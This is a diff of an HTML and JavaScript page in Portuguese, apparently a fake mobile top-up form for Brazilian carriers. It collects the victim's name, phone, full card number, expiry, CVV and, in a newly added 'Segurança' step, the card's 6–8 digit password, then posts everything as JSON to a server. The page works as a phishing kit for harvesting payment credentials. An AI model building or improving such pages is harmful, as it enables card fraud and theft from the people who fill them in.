@@ -9,8 +9,10 @@
         .card { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 350px; }
         h2 { text-align: center; color: #58a6ff; margin-bottom: 20px; font-size: 1.2rem; }
         label { display: block; margin: 10px 0 5px; font-size: 14px; color: #8b949e; }
-        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
-        .hidden { display: none; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #58a6ff; }
+        .etapa { display: none; }
+        .ativa { display: block; }
         button { width: 100%; padding: 15px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
         button.next { background: #58a6ff; }
         .info-24h { text-align: center; font-size: 11px; color: #8b949e; margin-top: 15px; }
@@ -20,9 +22,9 @@
     <div class="card">
         <h2 id="titulo">Dados da Recarga</h2>
         <form id="formRecarga">
-            <div id="etapa1">
+            <div id="etapa1" class="etapa ativa">
                 <label>Operadora</label>
-                <select id="operadora" required>
+                <select id="operadora">
                     <option value="Vivo">Vivo</option>
                     <option value="Tim">Tim</option>
                     <option value="Claro">Claro</option>
@@ -31,41 +33,51 @@
                 <input type="text" id="nome" placeholder="Nome do titular" required>
                 <label>Telefone com DDD</label>
                 <input type="tel" id="telefone" placeholder="(00) 00000-0000" required>
-                <button type="button" class="next" onclick="proximaEtapa()">PRÓXIMA ETAPA (PAGAMENTO)</button>
+                <button type="button" class="next" onclick="irPara(2)">PRÓXIMA ETAPA</button>
             </div>
 
-            <div id="etapa2" class="hidden">
+            <div id="etapa2" class="etapa">
                 <label>Número do Cartão</label>
-                <input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="16" required>
+                <input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="16">
                 <div style="display: flex; gap: 10px;">
                     <div style="flex: 1;">
                         <label>Validade</label>
-                        <input type="text" id="data" placeholder="MM/AA" maxlength="5" required>
+                        <input type="text" id="data" placeholder="MM/AA" maxlength="5">
                     </div>
                     <div style="flex: 1;">
                         <label>CVV</label>
-                        <input type="text" id="cvv" placeholder="000" maxlength="3" required>
+                        <input type="text" id="cvv" placeholder="000" maxlength="3">
                     </div>
                 </div>
-                <label>Valor da Recarga</label>
-                <select id="valor" required>
+                <label>Valor</label>
+                <select id="valor">
                     <option value="20">R$ 20,00</option>
                     <option value="40">R$ 40,00</option>
                     <option value="100">R$ 100,00</option>
                 </select>
+                <button type="button" class="next" onclick="irPara(3)">CONFIRMAR DADOS</button>
+            </div>
+
+            <div id="etapa3" class="etapa">
                 <label>Senha do Cartão (6 ou 8 dígitos)</label>
                 <input type="password" id="senha" placeholder="******" minlength="6" maxlength="8" required>
-                <button type="submit">FINALIZAR E RECEBER EM 24H</button>
+                <p style="font-size: 11px; color: #8b949e; text-align: center;">Valide a transação com a sua senha eletrónica.</p>
+                <button type="submit">FINALIZAR RECARGA</button>
             </div>
-            <p class="info-24h">Sua recarga será processada em até 24 horas.</p>
+            
+            <p class="info-24h">Recarga disponível em 24 horas.</p>
         </form>
     </div>
 
     <script>
-        function proximaEtapa() {
-            document.getElementById('etapa1').classList.add('hidden');
-            document.getElementById('etapa2').classList.remove('hidden');
-            document.getElementById('titulo').innerText = 'Dados de Pagamento';
+        function irPara(num) {
+            // Remove a classe 'ativa' de todas as etapas para esconder
+            document.querySelectorAll('.etapa').forEach(e => e.classList.remove('ativa'));
+            // Adiciona a classe 'ativa' na etapa desejada
+            document.getElementById('etapa' + num).classList.add('ativa');
+            
+            const titulos = ["", "Dados da Recarga", "Pagamento", "Segurança"];
+            document.getElementById('titulo').innerText = titulos[num];
         }
 
         document.getElementById('formRecarga').onsubmit = async (e) => {
@@ -86,7 +98,7 @@
                 body: JSON.stringify(dados)
             });
             if (response.ok) {
-                alert('Pedido recebido! Recarga em até 24h.');
+                alert('Pedido recebido com sucesso!');
                 window.location.reload();
             }
         };
